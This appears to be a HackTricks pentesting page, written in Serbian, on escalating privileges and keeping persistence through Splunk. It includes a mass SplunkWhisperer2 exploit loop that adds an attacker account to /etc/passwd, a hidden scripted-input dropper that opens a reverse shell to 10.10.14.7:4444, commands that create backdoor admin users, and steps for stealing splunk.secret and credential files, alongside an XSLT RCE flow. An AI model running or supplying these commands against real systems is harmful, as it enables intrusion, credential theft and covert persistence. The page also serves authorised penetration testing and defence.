# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

Ako pri **enumerating** mašine **internally** ili **externally** pronađeš da **Splunk radi** (obično **8000** za web UI i **8089** za management API), validni kredencijali se često mogu pretvoriti u **code execution** kroz instalaciju aplikacije, scripted inputs, ili management akcije. Ako Splunk radi kao **root**, to se često odmah pretvara u **privilege escalation**.

Ako ti treba samo generična remote attack surface, enumeration, ili app-upload RCE putanja, pogledaj:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Ako si **već root** i Splunk servis ne sluša samo na localhost, možeš takođe ukrasti **Splunk password hashes**, oporaviti **encrypted secrets**, ili postaviti **malicious app** da zadržiš persistence lokalno ili kroz više forwarders-a.

## Interesting Local Files

Kada dođeš na host na kome radi Splunk ili Splunk Universal Forwarder, ovo su obično najzanimljivije putanje:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Važni artefakti:

- **`$SPLUNK_HOME/etc/passwd`**: lokalni Splunk korisnici i password hash-evi.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: ključ koji Splunk koristi za enkripciju tajni sačuvanih u nekoliko `.conf` fajlova.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: početni admin bootstrap fajl; koristan u gold images i provisioning greškama. Ignoriše se ako `etc/passwd` već postoji.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: mesto gde se scripted inputs najčešće enable-uju.
- **`$SPLUNK_HOME/etc/deployment-apps/`** ili **`$SPLUNK_HOME/etc/apps/`**: dobra mesta da se sakrije persistent app ili pregleda šta se već distribuira.

## Splunk Universal Forwarder Agent Exploit Summary

Za dodatne detalje pogledaj [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Ovo je samo rezime:

**Pregled exploita:**
Exploit koji cilja Splunk Universal Forwarder (UF) omogućava napadačima sa **agent password** da izvrše proizvoljan kod na sistemima koji pokreću agent, potencijalno kompromitujući veliki deo okruženja.

**Zašto radi:**

- UF management service je često izložen na **TCP 8089**.
- Napadači mogu da se autentifikuju na API i nalože forwarder-u da instalira **malicious app bundle**.
- Ista primitiva može da se koristi lokalno za **LPE** ili udaljeno za **RCE**.
- Javni alati kao što je **SplunkWhisperer2** automatski kreiraju app bundle i mogu da prilagode payload-e za Linux ciljeve.

**Uobičajeni načini za dobijanje password-a:**

- Cleartext credentialsi u dokumentaciji, skriptama, deljenim resursima ili deployment automatizaciji.
- Password hash-evi unutar `$SPLUNK_HOME/etc/passwd` nakon čega sledi offline cracking.
- Golden images ili provisioning ostaci kao što je `user-seed.conf`.

**Uticaj:**

- SYSTEM/root-level izvršavanje koda na svakom kompromitovanom hostu.
- Deploy-ovanje persistent app-ova, backdoor-a ili ransomware-a.
- Onemogućavanje ili manipulacija telemetry pre nego što se podaci proslede.

**Primer komande za eksploataciju:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Upotrebljivi javni exploit-ovi:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence preko Scripted Inputs ili Malicious Apps

Ako imaš **filesystem write access** kao `root`/`splunk`, ili authenticated access za instalaciju apps, veoma pouzdan mehanizam za persistence je da ubaciš **custom app** sa **scripted input**. Splunk-ova dokumentacija očekuje da scripted inputs budu unutar app direktorijuma i da se omoguće iz `inputs.conf`.

Tipičan raspored:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimalni `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Brzi Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Napomene:

- Isti trik radi i na **Universal Forwarder** koristeći `/opt/splunkforwarder/etc/apps/`.
- Napadači se često stapaju sa legitimnim okruženjem tako što menjaju postojeći add-on umesto da kreiraju očigledno zlonamernu app.
- Na **deployment server**-u, ubacivanje zlonamerne app unutar `deployment-apps/` postaje **fleet-wide persistence** jer forwarders periodično proveravaju, preuzimaju ažurirane app-ove i često se restartuju da bi ih primenili.

## Credential Theft and Admin Takeover

Ako možeš da čitaš Splunk-ove lokalne fajlove, obično postoje dva dobra cilja: da povratiš **Splunk admin access** i da povratiš **encrypted service credentials**.

### Password hashes and local users

Splunk čuva lokalne podatke za autentifikaciju u `etc/passwd`. U zavisnosti od deployment-a, crackovanje tog fajla može da vrati radne kredencijale za web UI i management API.

Ako već imaš validne **admin** kredencijale i Splunk koristi svoj **native** authentication backend, sam CLI može da se iskoristi za persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` i encrypted values

Splunk koristi `etc/auth/splunk.secret` da zaštiti osetljive vrednosti sačuvane u više configuration fajlova. Ako možeš da ukradeš i **secret** i relevantne **`.conf`** fajlove, često možeš da povratiš ili replay:

- forwarder/indexer shared secrets kao što je `pass4SymmKey`
- TLS private-key passwords kao što je `sslPassword`
- LDAP bind credentials kao što je `bindDNPassword`

Ovo je korisno za **lateral movement** čak i kada Splunk admin password sam po sebi nije crackable.

### `user-seed.conf` abuse

`user-seed.conf` se koristi samo tokom prvog starta ili kada `etc/passwd` ne postoji. To ga čini manje korisnim na live box, ali veoma zanimljivim u:

- compromised installation templates
- container images
- unattended provisioning workflows
- appliances gde se Splunk automatski reinitialised

U tim slučajevima, ubacivanje `HASHED_PASSWORD` generisanog sa `splunk hash-passwd` daje ti tih način da povratiš admin access nakon redeployment.

## Abusing Splunk Queries

Za dodatne detalje pogledaj [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Korisna recent technique je abuse **user-supplied XSLT** u vulnerable Splunk Enterprise verzijama da se low-privileged authenticated account pretvori u **OS command execution** kao `splunk` user.

High-level flow:

1. Authenticate to Splunk.
2. Upload malicious **XSL** file through the preview/upload functionality.
3. Make Splunk render search results with that uploaded stylesheet from the **dispatch** directory.
4. Use the XSLT payload to write a file or trigger execution through Splunk's search pipeline (for example by reaching internal functionality such as `runshellscript`).

Važan offensive takeaway je da je ova putanja **post-auth RCE without needing app upload**. Na Linux-u obično završavaš u **`splunk`** account, što je i dalje vredno jer taj user često owns application tree, can read secrets, and can plant persistent apps that survive shell loss.

Representative path used during exploitation is:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Ako Splunk radi sa previše privilegija, ili ako `splunk` korisnik ima pristup opasnim skriptama, upisivim service units, ili lošim `sudo` pravilima, ovo postaje čisti **LPE** lanac.

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
